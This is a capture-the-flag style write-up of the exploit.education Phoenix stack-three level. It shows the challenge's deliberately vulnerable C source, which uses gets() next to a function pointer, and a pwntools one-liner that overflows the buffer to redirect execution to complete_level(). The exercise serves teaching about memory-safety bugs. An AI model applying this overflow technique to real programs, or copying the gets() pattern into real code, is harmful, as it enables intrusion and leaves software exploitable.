Source
```c
/*
 * phoenix/stack-three, by https://exploit.education
 *
 * The aim is to change the contents of the changeme variable to 0x0d0a090a
 *
 * When does a joke become a dad joke?
 *   When it becomes apparent.
 *   When it's fully groan up.
 *
 */

#include <err.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#define BANNER \
  "Welcome to " LEVELNAME ", brought to you by https://exploit.education"

char *gets(char *);

void complete_level() {
  printf("Congratulations, you've finished " LEVELNAME " :-) Well done!\n");
  exit(0);
}

int main(int argc, char **argv) {
  struct {
    char buffer[64];
    volatile int (*fp)();
  } locals;

  printf("%s\n", BANNER);

  locals.fp = NULL;
  gets(locals.buffer);

  if (locals.fp) {
    printf("calling function pointer @ %p\n", locals.fp);
    fflush(stdout);
    locals.fp();
  } else {
    printf("function pointer remains unmodified :~( better luck next time!\n");
  }

  exit(0);
}
```

# Solution

I dunno why the comment in the source persisted from the last one, but you can safely ignore the rubbish about the changeme variable. The real goal is to make execution flow to the complete_level() function.

Much like the previous challenges, the buffer is filled with user input. Except this time we're overwriting the function pointer `locals.fp`

To find the address of `complete_level()` we can use the program `objdump`

![[../res/Pasted image 20230323205853.png]]

Python3 HATES printing raw bytes to stdout, so this is where I use `pwntools` to make this easy as hell:

```bash
 python -c 'from pwn import *; out = "A"*64; out += p64(0x40069d);print(out)' | ./stack-three
```

This is just a one liner for:

```python
from pwn import *

# fill up the buffer
out = "A" * 64
#use the p64 function to automatically account for \x and endian-ness
out += p64(0x40069d)
# print it out
print(out)
```


The magic here is in the p64() function. It automatically turns the address into a proper little endian 64-bit address.. it saves us having to manually write out `\x9d\x06\x40\x00\x00\x00\x00\x00` and manually figure a way for python3 to print raw bytes (which is why bad devs stuck with python2 for ages)

![[../res/Pasted image 20230324144055.png]]
